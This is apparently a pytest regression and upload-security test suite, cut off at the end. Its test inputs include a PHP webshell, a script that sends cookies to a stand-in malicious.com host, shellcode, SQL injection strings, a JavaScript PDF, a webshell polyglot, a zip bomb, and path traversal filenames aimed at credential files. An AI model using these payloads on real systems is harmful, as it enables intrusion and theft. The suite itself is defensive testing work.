"""
Automated Regression Test Suite for Fixed Bugs with Security Tests
Single file implementation with file upload security testing
"""

import os
import sys
import json
import time
import logging
import hashlib
import random
import string
import pytest
import requests
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import mimetypes
import zipfile
import tempfile
from io import BytesIO

# ============================================
# CONFIGURATION
# ============================================

class TestConfig:
    """Configuration settings for regression tests"""
    
    # Base paths
    BASE_DIR = Path(__file__).parent
    TEST_DATA_DIR = BASE_DIR / "test_data"
    REPORTS_DIR = BASE_DIR / "test_reports"
    SCREENSHOTS_DIR = BASE_DIR / "screenshots"
    LOGS_DIR = BASE_DIR / "test_logs"
    MALICIOUS_FILES_DIR = BASE_DIR / "malicious_files"
    
    # Test execution settings
    PARALLEL_EXECUTION = False
    MAX_WORKERS = 4
    RETRY_COUNT = 2
    RETRY_DELAY = 5  # seconds
    
    # Reporting
    GENERATE_HTML_REPORT = True
    GENERATE_XML_REPORT = True
    REPORT_NAME = "regression_test_report"
    
    # Logging
    LOG_LEVEL = "INFO"
    LOG_FILE = LOGS_DIR / "regression_tests.log"
    
    # API Settings
    API_BASE_URL = os.getenv("API_BASE_URL", "http://localhost:8000")
    API_TIMEOUT = 30
    API_RETRY = 3
    
    # File Upload Security Settings
    MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB
    ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf', '.doc', '.docx'}
    ALLOWED_MIME_TYPES = {
        'image/jpeg', 'image/png', 'image/gif', 
        'application/pdf', 'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    }
    BLOCKED_EXTENSIONS = {'.exe', '.bat', '.sh', '.js', '.php', '.asp', '.jsp'}
    SCAN_MALICIOUS_CONTENT = True
    VIRUS_SCAN_ENABLED = False  # Set to True if antivirus integration is available
    
    @classmethod
    def create_directories(cls):
        """Create necessary directories if they don't exist"""
        directories = [
            cls.TEST_DATA_DIR,
            cls.REPORTS_DIR,
            cls.SCREENSHOTS_DIR,
            cls.LOGS_DIR,
            cls.MALICIOUS_FILES_DIR
        ]
        for directory in directories:
            directory.mkdir(parents=True, exist_ok=True)

# ============================================
# LOGGING SETUP
# ============================================

TestConfig.create_directories()
logging.basicConfig(
    level=TestConfig.LOG_LEVEL,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(TestConfig.LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================================
# FILE GENERATOR FOR SECURITY TESTS
# ============================================

class MaliciousFileGenerator:
    """Generate various types of malicious files for security testing"""
    
    @staticmethod
    def generate_php_webshell() -> bytes:
        """Generate a PHP webshell for testing"""
        return b"""<?php
        // Simple PHP webshell for testing
        if(isset($_GET['cmd'])){
            $cmd = $_GET['cmd'];
            system($cmd);
        }
        ?>"""
    
    @staticmethod
    def generate_javascript_injection() -> bytes:
        """Generate JavaScript injection payload"""
        return b"""<script>
        alert('XSS Vulnerability Test');
        fetch('http://malicious.com/steal?cookie=' + document.cookie);
        </script>"""
    
    @staticmethod
    def generate_sql_injection_file() -> bytes:
        """Generate SQL injection payload in file"""
        return b"""'; DROP TABLE users; -- 
        UNION SELECT username, password FROM users
        ' OR '1'='1
        """
    
    @staticmethod
    def generate_double_extension_file() -> bytes:
        """Generate file with double extension trick"""
        return b"Test file with double extension exploit"
    
    @staticmethod
    def generate_zip_bomb() -> bytes:
        """Generate a zip bomb for decompression testing"""
        # Create a small zip with highly compressed data
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # 10MB of repeating zeros compressed to small size
            huge_data = b'\x00' * (10 * 1024 * 1024)
            zip_file.writestr('huge_file.txt', huge_data)
        return zip_buffer.getvalue()
    
    @staticmethod
    def generate_binary_exploit() -> bytes:
        """Generate binary exploit payload"""
        return b'\x90' * 100 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    
    @staticmethod
    def generate_malformed_image() -> bytes:
        """Generate malformed image file"""
        # Create malformed JPEG header
        return b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xFE\x00\x10Malformed Image'
    
    @staticmethod
    def generate_file_with_metadata_exploit() -> bytes:
        """Generate file with malicious metadata"""
        return b"""%PDF-1.4
        1 0 obj
        << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
        endobj
        3 0 obj
        << /Type /Action /S /JavaScript /JS (app.alert('XSS')) >>
        endobj
        """
    
    @staticmethod
    def generate_content_type_mismatch() -> Tuple[bytes, str]:
        """Generate file with mismatched content type"""
        # Text file disguised as image
        content = b"This is a text file but will be sent as image/jpeg"
        return content, "image/jpeg"

class SecurityTestFileGenerator:
    """Generate test files for security testing"""
    
    @staticmethod
    def create_test_file(extension: str, content: bytes = None, size: int = 1024) -> Tuple[str, bytes]:
        """Create a test file with specified extension and content"""
        if content is None:
            content = b'This is a test file for security testing\n' + os.urandom(size)
        
        filename = f"security_test_{int(time.time())}{extension}"
        return filename, content
    
    @staticmethod
    def create_large_file(size_mb: int) -> Tuple[str, bytes]:
        """Create a large file for size limit testing"""
        size_bytes = size_mb * 1024 * 1024
        filename = f"large_file_{size_mb}mb.bin"
        content = os.urandom(size_bytes)
        return filename, content
    
    @staticmethod
    def create_polyglot_file() -> Tuple[str, bytes]:
        """
        Create a polyglot file (valid as multiple file types)
        GIFAR: Valid GIF and ZIP file
        """
        # GIF header
        gif_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        # ZIP content
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('malicious.php', MaliciousFileGenerator.generate_php_webshell())
        
        content = gif_header + zip_buffer.getvalue()
        return "polyglot.gif", content

# ============================================
# TEST HELPERS
# ============================================

class TestHelpers:
    """Helper methods for test operations"""
    
    @staticmethod
    def generate_unique_id(prefix: str = "") -> str:
        """Generate unique identifier"""
        timestamp = int(time.time() * 1000)
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"{prefix}_{timestamp}_{random_suffix}"
    
    @staticmethod
    def generate_test_email() -> str:
        """Generate unique test email"""
        return f"test_{TestHelpers.generate_unique_id()}@example.com"
    
    @staticmethod
    def generate_test_phone() -> str:
        """Generate test phone number"""
        return f"+1{''.join(random.choices(string.digits, k=10))}"
    
    @staticmethod
    def calculate_hash(data: Any) -> str:
        """Calculate hash of data for verification"""
        if isinstance(data, dict):
            data = json.dumps(data, sort_keys=True)
        return hashlib.md5(str(data).encode()).hexdigest()
    
    @staticmethod
    def wait_for_condition(condition_func, timeout: int = 30, interval: int = 1):
        """Wait for a condition to be true"""
        start_time = time.time()
        while time.time() - start_time < timeout:
            if condition_func():
                return True
            time.sleep(interval)
        return False
    
    @staticmethod
    def compare_json_structures(expected: Dict, actual: Dict, 
                                ignore_keys: List[str] = None) -> bool:
        """Compare JSON structures with option to ignore keys"""
        if ignore_keys is None:
            ignore_keys = []
        
        def clean_data(data):
            if isinstance(data, dict):
                return {k: clean_data(v) for k, v in data.items() 
                       if k not in ignore_keys}
            elif isinstance(data, list):
                return [clean_data(item) for item in data]
            return data
        
        cleaned_expected = clean_data(expected)
        cleaned_actual = clean_data(actual)
        
        return cleaned_expected == cleaned_actual
    
    @staticmethod
    def extract_value_from_path(data: Dict, path: str) -> Any:
        """Extract value from nested dict using dot notation"""
        keys = path.split('.')
        current = data
        for key in keys:
            if key in current:
                current = current[key]
            else:
                return None
        return current
    
    @staticmethod
    def check_file_signature(content: bytes, expected_signature: bytes) -> bool:
        """Check if file content starts with expected signature"""
        return content.startswith(expected_signature)
    
    @staticmethod
    def detect_malicious_content(content: bytes) -> Dict[str, bool]:
        """Detect potential malicious content in file"""
        threats = {
            'php_code': b'<?php' in content or b'<?=' in content,
            'javascript': b'<script>' in content.lower() or b'javascript:' in content.lower(),
            'sql_injection': b'union select' in content.lower() or b'drop table' in content.lower(),
            'binary_exploit': b'\x90\x90\x90' in content,  # NOP sled detection
            'html_injection': b'<html>' in content.lower() or b'<body>' in content.lower(),
            'shell_command': b'system(' in content.lower() or b'exec(' in content.lower(),
            'eval_code': b'eval(' in content.lower(),
            'base64_encoded': len([c for c in content if c in string.ascii_letters + string.digits + '+/=']) / len(content) > 0.8,
        }
        return threats

# ============================================
# TEST BASE CLASS
# ============================================

class TestBase:
    """Base class for all regression tests"""
    
    @pytest.fixture(autouse=True)
    def setup_method(self, request):
        """Setup method that runs before each test"""
        self.test_name = request.node.name
        self.test_start_time = datetime.now()
        self.test_data = {}
        self.verification_results = []
        self.screenshots = []
        self.uploaded_files = []
        
        logger.info(f"Starting test: {self.test_name}")
        TestConfig.create_directories()
        
        yield
        
        # Teardown
        test_duration = (datetime.now() - self.test_start_time).total_seconds()
        logger.info(f"Completed test: {self.test_name} (Duration: {test_duration:.2f}s)")
        
        # Cleanup uploaded files
        self._cleanup_files()
        self._save_test_artifacts()
    
    def _cleanup_files(self):
        """Clean up temporary files created during tests"""
        for file_path in self.uploaded_files:
            try:
                if Path(file_path).exists():
                    Path(file_path).unlink()
                    logger.debug(f"Cleaned up file: {file_path}")
            except Exception as e:
                logger.warning(f"Failed to clean up file {file_path}: {str(e)}")
    
    def _save_test_artifacts(self):
        """Save test artifacts like screenshots, logs, etc."""
        if hasattr(self, 'screenshots') and self.screenshots:
            screenshot_dir = TestConfig.SCREENSHOTS_DIR / self.test_name
            screenshot_dir.mkdir(exist_ok=True)
            for idx, screenshot in enumerate(self.screenshots):
                file_path = screenshot_dir / f"screenshot_{idx}.png"
                logger.info(f"Screenshot saved: {file_path}")
    
    def verify_response(self, response: requests.Response, 
                        expected_status: int = 200,
                        expected_data: Optional[Dict] = None) -> bool:
        """Verify API response status and data"""
        try:
            assert response.status_code == expected_status, \
                f"Expected status {expected_status}, got {response.status_code}"
            
            if expected_data and response.content:
                response_data = response.json()
                for key, value in expected_data.items():
                    assert response_data.get(key) == value, \
                        f"Expected {key}={value}, got {response_data.get(key)}"
            
            logger.info(f"Verification passed for {response.url}")
            return True
            
        except AssertionError as e:
            logger.error(f"Verification failed: {str(e)}")
            self.verification_results.append({
                'test': self.test_name,
                'status': 'failed',
                'error': str(e)
            })
            raise
        except Exception as e:
            logger.error(f"Unexpected error during verification: {str(e)}")
            raise
    
    def assert_equals(self, actual: Any, expected: Any, message: str = ""):
        """Custom assertion with logging"""
        try:
            assert actual == expected, f"{message} Expected {expected}, got {actual}"
            logger.debug(f"Assertion passed: {actual} == {expected}")
        except AssertionError as e:
            logger.error(f"Assertion failed: {str(e)}")
            raise
    
    def assert_true(self, condition: bool, message: str = ""):
        """Custom assertion for true condition"""
        try:
            assert condition, f"{message} Condition is False"
            logger.debug(f"Assertion passed: {condition}")
        except AssertionError as e:
            logger.error(f"Assertion failed: {str(e)}")
            raise
    
    def assert_security_violation_detected(self, response: requests.Response):
        """Assert that security violation was properly detected"""
        # Check for security headers
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'Content-Security-Policy'
        ]
        
        for header in security_headers:
            if header in response.headers:
                logger.debug(f"Security header present: {header}")
        
        # Check response for security indicators
        if response.status_code in [400, 403, 415, 500]:
            return True
        
        return False

# ============================================
# SECURITY TESTS FOR FILE UPLOADS
# ============================================

class TestFileUploadSecurity(TestBase):
    """Security test suite for file upload functionality"""
    
    @pytest.fixture
    def api_client(self):
        """Fixture for API client"""
        session = requests.Session()
        session.base_url = TestConfig.API_BASE_URL
        session.timeout = TestConfig.API_TIMEOUT
        return session
    
    # ============================================
    # TEST 1: Malicious File Uploads
    # ============================================
    
    @pytest.mark.security
    @pytest.mark.parametrize("malware_type,file_generator", [
        ("php_webshell", MaliciousFileGenerator.generate_php_webshell),
        ("javascript_injection", MaliciousFileGenerator.generate_javascript_injection),
        ("sql_injection", MaliciousFileGenerator.generate_sql_injection_file),
        ("binary_exploit", MaliciousFileGenerator.generate_binary_exploit),
        ("malformed_image", MaliciousFileGenerator.generate_malformed_image),
    ])
    def test_malicious_file_upload(self, api_client, malware_type, file_generator):
        """
        Test that malicious files are properly detected and blocked
        """
        logger.info(f"Testing malicious file upload: {malware_type}")
        
        # Generate malicious content
        content = file_generator()
        filename = f"malicious_{malware_type}.txt"
        
        # Try to upload malicious file
        response = self._upload_file(api_client, filename, content)
        
        # Verify security violation detection
        security_detected = self.assert_security_violation_detected(response)
        assert security_detected, f"Security violation not detected for {malware_type}"
        
        # Ensure file is not accepted
        assert response.status_code in [400, 403, 415], \
            f"Expected error status for {malware_type}, got {response.status_code}"
        
        # Verify error message contains security indicator
        if response.content:
            response_data = response.json()
            error_msg = str(response_data).lower()
            security_keywords = ['malicious', 'virus', 'security', 'invalid', 'blocked', 'forbidden']
            contains_keyword = any(keyword in error_msg for keyword in security_keywords)
            assert contains_keyword, f"No security-related error message for {malware_type}"
        
        logger.info(f"Malicious file {malware_type} successfully blocked")
    
    # ============================================
    # TEST 2: File Type Validation
    # ============================================
    
    @pytest.mark.security
    @pytest.mark.parametrize("extension,is_allowed", [
        ('.jpg', True),
        ('.png', True),
        ('.pdf', True),
        ('.exe', False),
        ('.bat', False),
        ('.sh', False),
        ('.php', False),
        ('.js', False),
    ])
    def test_file_extension_validation(self, api_client, extension, is_allowed):
        """
        Test that file extensions are properly validated
        """
        logger.info(f"Testing file extension validation: {extension}")
        
        filename = f"test_file{extension}"
        content = b"This is a test file for extension validation"
        
        response = self._upload_file(api_client, filename, content)
        
        if is_allowed:
            assert response.status_code in [200, 201], \
                f"Allowed extension {extension} should be accepted"
        else:
            assert response.status_code in [400, 403, 415], \
                f"Blocked extension {extension} should be rejected"
        
        logger.info(f"Extension {extension} validation: {'PASSED' if is_allowed else 'BLOCKED'}")
    
    @pytest.mark.security
    def test_content_type_mismatch_detection(self, api_client):
        """
        Test that content type mismatch is detected
        """
        logger.info("Testing content type mismatch detection")
        
        # Generate file with mismatched content type
        content = b"This is actually a text file"
        filename = "fake_image.jpg"
        
        # Upload with mismatched content type
        files = {
            'file': (filename, content, 'image/jpeg')  # Mismatched MIME type
        }
        
        response = api_client.post(
            f"{TestConfig.API_BASE_URL}/api/upload",
            files=files
        )
        
        # Should detect and block mismatch
        assert response.status_code in [400, 415, 403], \
            f"Content type mismatch should be detected, got {response.status_code}"
        
        # Verify error indicates content type issue
        if response.content:
            response_data = response.json()
            error_msg = str(response_data).lower()
            content_keywords = ['type', 'mime', 'content', 'format', 'invalid']
            contains_keyword = any(keyword in error_msg for keyword in content_keywords)
            assert contains_keyword, "No content type-related error message"
        
        logger.info("Content type mismatch successfully detected")
    
    # ============================================
    # TEST 3: File Size Limits
    # ============================================
    
    @pytest.mark.security
    @pytest.mark.parametrize("size_mb,should_pass", [
        (1, True),   # Small file
        (5, True),   # Medium file
        (11, False), # Just over limit
        (50, False), # Large file
        (100, False), # Very large file
    ])
    def test_file_size_limits(self, api_client, size_mb, should_pass):
        """
        Test that file size limits are enforced
        """
        logger.info(f"Testing file size limit: {size_mb}MB (should {'pass' if should_pass else 'fail'})")
        
        # Create file of specified size
        filename, content = SecurityTestFileGenerator.create_large_file(size_mb)
        
        try:
            response = self._upload_file(api_client, filename, content)
            
            if should_pass:
                assert response.status_code in [200, 201], \
                    f"File of size {size_mb}MB should be accepted"
            else:
                assert response.status_code in [400, 413, 403], \
                    f"File of size {size_mb}MB should be rejected (too large)"
                
                # Verify error indicates size limit
                if response.content:
                    response_data = response.json()
                    error_msg = str(response_data).lower()
                    size_keywords = ['size', 'large', 'limit', 'exceed', 'too big']
                    contains_keyword = any(keyword in error_msg for keyword in size_keywords)
                    assert contains_keyword, "No size-related error message"
        
        finally:
            # Clean up large file
            if os.path.exists(filename):
                os.remove(filename)
        
        logger.info(f"File size limit test for {size_mb}MB: {'PASSED' if should_pass else 'BLOCKED'}")
    
    # ============================================
    # TEST 4: ZIP Bomb / Decompression Attacks
    # ============================================
    
    @pytest.mark.security
    def test_zip_bomb_protection(self, api_client):
        """
        Test that zip bomb attacks are detected and blocked
        """
        logger.info("Testing zip bomb protection")
        
        # Generate zip bomb
        content = MaliciousFileGenerator.generate_zip_bomb()
        filename = "zip_bomb.zip"
        
        response = self._upload_file(api_client, filename, content)
        
        # Should detect and block zip bomb
        assert response.status_code in [400, 403, 413], \
            f"Zip bomb should be blocked, got {response.status_code}"
        
        # Verify error indicates compression/archive issue
        if response.content:
            response_data = response.json()
            error_msg = str(response_data).lower()
            archive_keywords = ['zip', 'archive', 'compression', 'size', 'too large', 'exceed']
            contains_keyword = any(keyword in error_msg for keyword in archive_keywords)
            assert contains_keyword, "No zip bomb-related error message"
        
        logger.info("Zip bomb successfully blocked")
    
    # ============================================
    # TEST 5: Double Extension Exploits
    # ============================================
    
    @pytest.mark.security
    @pytest.mark.parametrize("filename", [
        "virus.jpg.php",
        "doc.pdf.exe",
        "file.txt.js",
        "image.png.sh",
        "backup.zip.bat",
    ])
    def test_double_extension_attacks(self, api_client, filename):
        """
        Test that double extension attacks are prevented
        """
        logger.info(f"Testing double extension attack: {filename}")
        
        content = b"This file attempts to hide its true extension"
        
        response = self._upload_file(api_client, filename, content)
        
        # Should detect and block double extensions
        assert response.status_code in [400, 403, 415], \
            f"Double extension {filename} should be blocked, got {response.status_code}"
        
        # Verify error indicates extension issue
        if response.content:
            response_data = response.json()
            error_msg = str(response_data).lower()
            extension_keywords = ['extension', 'invalid', 'format', 'type', 'blocked']
            contains_keyword = any(keyword in error_msg for keyword in extension_keywords)
            assert contains_keyword, "No extension-related error message"
        
        logger.info(f"Double extension {filename} successfully blocked")
    
    # ============================================
    # TEST 6: Polyglot / GIFAR Attacks
    # ============================================
    
    @pytest.mark.security
    def test_polyglot_file_upload(self, api_client):
        """
        Test that polyglot files (GIFAR) are detected and blocked
        """
        logger.info("Testing polyglot file upload (GIFAR)")
        
        # Create polyglot file
        filename, content = SecurityTestFileGenerator.create_polyglot_file()
        
        response = self._upload_file(api_client, filename, content)
        
        # Should detect and block polyglot
        assert response.status_code in [400, 403, 415], \
            f"Polyglot file should be blocked, got {response.status_code}"
        
        # Verify error indicates file type issue
        if response.content:
            response_data = response.json()
            error_msg = str(response_data).lower()
            polyglot_keywords = ['polyglot', 'corrupt', 'invalid', 'format', 'malicious']
            contains_keyword = any(keyword in error_msg for keyword in polyglot_keywords)
            assert contains_keyword, "No polyglot-related error message"
        
        logger.info("Polyglot file successfully blocked")
    
    # ============================================
    # TEST 7: Malicious Metadata
    # ============================================
    
    @pytest.mark.security
    def test_malicious_metadata_detection(self, api_client):
        """
        Test that malicious metadata in files is detected
        """
        logger.info("Testing malicious metadata detection")
        
        # Generate file with malicious metadata
        content = MaliciousFileGenerator.generate_file_with_metadata_exploit()
        filename = "malicious_metadata.pdf"
        
        response = self._upload_file(api_client, filename, content)
        
        # Should detect and block malicious metadata
        assert response.status_code in [400, 403, 415], \
            f"Malicious metadata should be blocked, got {response.status_code}"
        
        # Verify error indicates metadata issue
        if response.content:
            response_data = response.json()
            error_msg = str(response_data).lower()
            metadata_keywords = ['metadata', 'script', 'javascript', 'malicious', 'unsafe']
            contains_keyword = any(keyword in error_msg for keyword in metadata_keywords)
            assert contains_keyword, "No metadata-related error message"
        
        logger.info("Malicious metadata successfully detected")
    
    # ============================================
    # TEST 8: Concurrent Upload Attacks
    # ============================================
    
    @pytest.mark.security
    def test_concurrent_upload_attacks(self, api_client):
        """
        Test that concurrent upload attacks are handled
        """
        logger.info("Testing concurrent upload attacks")
        
        def upload_worker(file_index):
            """Worker function for concurrent uploads"""
            filename = f"concurrent_test_{file_index}.txt"
            content = f"Testing concurrent upload {file_index}".encode()
            
            try:
                response = self._upload_file(api_client, filename, content)
                return response.status_code
            except Exception as e:
                logger.error(f"Upload worker {file_index} failed: {str(e)}")
                return 500
        
        # Launch multiple concurrent uploads
        num_uploads = 50
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(upload_worker, i) for i in range(num_uploads)]
            results = [future.result() for future in as_completed(futures)]
        
        # Check results
        success_count = sum(1 for r in results if r in [200, 201])
        failure_count = sum(1 for r in results if r >= 400)
        
        # Rate limiting should be in place
        assert failure_count > 0, "Concurrent uploads should trigger rate limiting"
        assert success_count < num_uploads, "All uploads should not succeed (rate limiting)"
        
        logger.info(f"Concurrent upload test: {success_count} succeeded, {failure_count} failed")
    
    # ============================================
    # TEST 9: Path Traversal in Filename
    # ============================================
    
    @pytest.mark.security
    @pytest.mark.parametrize("filename", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config",
        "../../etc/shadow",
        "file/../../../root/.ssh/id_rsa",
        "..\\..\\..\\..\\..\\..\\etc\\hosts",
    ])
    def test_path_traversal_upload(self, api_client, filename):
        """
        Test that path traversal attacks in filenames are prevented
        """
        logger.info(f"Testing path traversal attack: {filename}")
        
        content = b"Attempting to traverse directories"
        
        response = self._upload_file(api_client, filename, content)
        
        # Should detect and block path traversal
        assert response.status_code in [400, 403, 415], \
            f"Path traversal in filename should be blocked, got {response.status_code}"
        
        # Verify error indicates path issue
        if response.content:
            response_data = response.json()
            error_msg = str(response_data).lower()
            path_keywords = ['path', 'directory', 'traversal', 'invalid', 'security']
            contains_keyword = any(keyword in error_msg for keyword in path_keywords)
            assert contains_keyword, "No path traversal-related error message"
        
        logger.info(f"Path traversal attack successfully blocked")
    
    # ============================================
    # TEST 10: Scanner Evasion Techniques
    # ============================================
    
    @pytest.mark.security
    def test_scanner_evasion_techniques(self, api_client):
        """
        Test various scanner evasion techniques
        """
        logger.info("Testing scanner evasion techniques")
        
        evasion_techniques = [
            {
                "name": "null_byte_injection",
                "filename": "file.php\x00.jpg",
                "content": b"<?php echo 'test'; ?>"
            },
            {
                "name": "case_mangling",
                "filename": "file.PhP",
                "content": b"<?php echo 'test'; ?>"
            },
            {
                "name": "unicode_encoding",
                "filename": "file%2Ephp.jpg",
                "content": b"<?php echo 'test'; ?>"
            },
            {
                "name": "double_encoding",
                "filename": "file%252Ephp.jpg",
                "content": b"<?php echo 'test'; ?>"
            },
            {
                "name": "alternate_data_stream",
                "filename": "file.php::$DATA",
                "content": b"<?php echo 'test'; ?>"
            }
        ]
        
        for technique in evasion_techniques:
            logger.info(f"Testing evasion technique: {technique['name']}")
            
            response = self._upload_file(
                api_client, 
                technique['filename'], 
                technique['content']
            )
            
            # All evasion attempts should be blocked
            assert response.status_code in [400, 403, 415], \
                f"Evasion technique {technique['name']} should be blocked, got {response.status_code}"
            
            # Verify security detection
            security_detected = self.assert_security_violation_detected(response)
            assert security_detected, f"Security not detected for {technique['name']}"
        
        logger.info("All scanner evasion techniques successfully detected")
    
    # ============================================
    # TEST 11: Upload Rate Limiting
    # ============================================
    
    @pytest.mark.security
    def test_upload_rate_limiting(self, api_client):
        """
        Test that upload rate limiting is enforced
        """
        logger.info("Testing upload rate limiting")
        
        filename = "rate_limit_test.txt"
        content = b"Rate limiting test content"
        
        start_time = time.time()
        responses = []
        
        # Send rapid consecutive uploads
        for i in range(20):
            response = self._upload_file(api_client, filename, content)
            responses.append(response.status_code)
            time.sleep(0.1)  # Small delay
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Check for rate limiting
        rate_limited = any(status in [429, 403, 400] for status in responses)
        assert rate_limited, "Rate limiting should be enforced for rapid uploads"
        
        # Some requests should fail
        failures = sum(1 for status in responses if status >= 400)
        assert failures > 0, "Some uploads should fail due to rate limiting"
        
        logger.info(f"Rate limiting test: {len(responses)} uploads in {duration:.2f}s, {failures} failed")
    
    # ============================================
    # Helper Methods
    # ============================================
    
    def _upload_file(self, client, filename: str, content: bytes, 
                    content_type: str = None) -> requests.Response:
        """
        Upload a file with proper multipart form data
        """
        if content_type is None:
            content_type = 'application/octet-stream'
        
        files = {
            'file': (filename, content, content_type)
        }
        
        try:
            response = client.post(
                f"{TestConfig.API_BASE_URL}/api/upload",
                files=files
            )
            
            # Log upload attempt
            logger.debug(f"Uploaded {filename}: Status {response.status_code}")
            
            return response
            
        except requests.RequestException as e:
            logger.error(f"Upload failed: {str(e)}")
            raise

# ============================================
# REGRESSION TESTS FOR FIXED BUGS
# ============================================

class TestFixedBugs(TestBase):
    """Test suite for verifying fixed bugs don't regress"""
    
    @pytest.fixture
    def api_client(self):
        """Fixture for API client"""
        session = requests.Session()
        session.base_url = TestConfig.API_BASE_URL
        session.timeout = TestConfig.API_TIMEOUT
        return session
    
    @pytest.mark.regression
    @pytest.mark.bug_fix
    def test_fixed_bug_123_profile_update(self, api_client):
        """
        BUG-123: Profile update with special characters
        Verify that special characters are properly sanitized
        """
        logger.info("Testing fixed bug: BUG-123")
        
        test_payload = {
            "user_id": 1,
            "name": "<script>alert('xss')</script>",
            "bio": "Test & Special < > \" ' characters",
            "email": "test@example.com"
        }
        
        response = self._execute_request(
            api_client,
            "/api/users/1/profile",
            "POST",
            test_payload
        )
        
        self.verify_response(response, expected_status=200)
        
        data = response.json()
        assert "profile_updated" in data
        assert data["profile_updated"] is True
        
        if "sanitized_data" in data:
            sanitized = data["sanitized_data"]
            assert "<script>" not in str(sanitized)
            assert "&lt;" in str(sanitized) or "&gt;" in str(sanitized)
        
        logger.info("BUG-123 regression test passed")
    
    @pytest.mark.regression
    @pytest.mark.bug_fix
    def test_fixed_bug_456_account_deletion(self, api_client):
        """
        BUG-456: Account deletion with dependencies
        Verify that all associated data is properly removed
        """
        logger.info("Testing fixed bug: BUG-456")
        
        test_payload = {
            "user_id": 2,
            "delete_associated_data": True,
            "reason": "Testing account deletion"
        }
        
        response = self._execute_request(
            api_client,
            "/api/users/2/delete",
            "DELETE",
            test_payload
        )
        
        self.verify_response(response, expected_status=200)
        
        data = response.json()
        assert "deleted" in data
        assert data["deleted"] is True
        assert "associated_data_removed" in data
        assert data["associated_data_removed"] is True
        
        if "deleted_at" in data:
            deleted_time = datetime.fromisoformat(data["deleted_at"])
            assert datetime.now() - deleted_time < timedelta(minutes=5)
        
        logger.info("BUG-456 regression test passed")
    
    @pytest.mark.regression
    @pytest.mark.bug_fix
    def test_fixed_bug_789_order_creation(self, api_client):
        """
        BUG-789: Order creation with edge cases
        Verify order total calculation and status
        """
        logger.info("Testing fixed bug: BUG-789")
        
        test_payload = {
            "items": [
                {"id": 1, "quantity": 2, "price": 10.99},
                {"id": 2, "quantity": 1, "price": 25.50}
            ],
            "shipping_address": "123 Test St, Test City, TC 12345",
            "payment_method": "credit_card"
        }
        
        response = self._execute_request(
            api_client,
            "/api/orders",
            "POST",
            test_payload
        )
        
        self.verify_response(response, expected_status=200)
        
        data = response.json()
        assert "order_id" in data
        assert "status" in data
        assert data["status"] in ["pending", "confirmed"]
        
        if "total" in data:
            assert data["total"] >= 0
            assert abs(data["total"] - round(data["total"], 2)) < 0.001
        
        logger.info("BUG-789 regression test passed")
    
    def _execute_request(self, client, endpoint: str, method: str, 
                         payload: Dict[str, Any]) -> requests.Response:
        """Execute HTTP request with retry logic"""
        url = f"{TestConfig.API_BASE_URL}{endpoint}"
        
        for attempt in range(TestConfig.RETRY_COUNT + 1):
            try:
                if method.upper() == "GET":
                    response = client.get(url, params=payload)
                elif method.upper() == "POST":
                    response = client.post(url, json=payload)
                elif method.upper() == "PUT":
                    response = client.put(url, json=payload)
                elif method.upper() == "DELETE":
                    response = client.delete(url, json=payload)
                else:
                    raise ValueError(f"Unsupported method: {method}")
                
                logger.info(f"Executed {method} request to {endpoint}")
                return response
                
            except requests.RequestException as e:
                logger.warning(f"Request attempt {attempt + 1} failed: {str(e)}")
                if attempt < TestConfig.RETRY_COUNT:
                    time.sleep(TestConfig.RETRY_DELAY)
                    continue
                raise
        
        raise Exception(f"Request failed after {TestConfig.RETRY_COUNT} retries")

# ============================================
# TEST SUITE RUNNER
# ============================================

class TestSuiteRunner:
    """Main orchestrator for running regression test suites"""
    
    def __init__(self):
        self.start_time = None
        self.end_time = None
        self.test_results = []
        self.failed_tests = []
        self.passed_tests = []
        
    def run_all_tests(self) -> Dict[str, Any]:
        """Run all regression tests including security tests"""
        logger.info("=" * 80)
        logger.info("STARTING REGRESSION TEST SUITE EXECUTION")
        logger.info("(Includes Security Tests for File Uploads)")
        logger.info("=" * 80)
        
        self.start_time = datetime.now()
        
        try:
            test_args = [
                "-v",
                "--tb=short",
                "--maxfail=10",
                "--strict-markers",
                "-m", "regression or security",
                __file__
            ]
            
            if TestConfig.GENERATE_HTML_REPORT:
                report_path = TestConfig.REPORTS_DIR / f"{TestConfig.REPORT_NAME}.html"
                test_args.extend(["--html", str(report_path)])
            
            if TestConfig.GENERATE_XML_REPORT:
                xml_path = TestConfig.REPORTS_DIR / f"{TestConfig.REPORT_NAME}.xml"
                test_args.extend(["--junitxml", str(xml_path)])
            
            exit_code = pytest.main(test_args)
            
            self.end_time = datetime.now()
            duration = (self.end_time - self.start_time).total_seconds()
            
            result_summary = {
                "status": "PASSED" if exit_code == 0 else "FAILED",
                "exit_code": exit_code,
                "duration": duration,
                "start_time": self.start_time.isoformat(),
                "end_time": self.end_time.isoformat()
            }
            
            logger.info("=" * 80)
            logger.info("REGRESSION TEST SUITE COMPLETED")
            logger.info(f"Status: {result_summary['status']}")
            logger.info(f"Duration: {duration:.2f} seconds")
            logger.info("=" * 80)
            
            self._generate_summary_report(result_summary)
            
            return result_summary
            
        except Exception as e:
            logger.error(f"Test suite execution failed: {str(e)}")
            return {
                "status": "ERROR",
                "error": str(e),
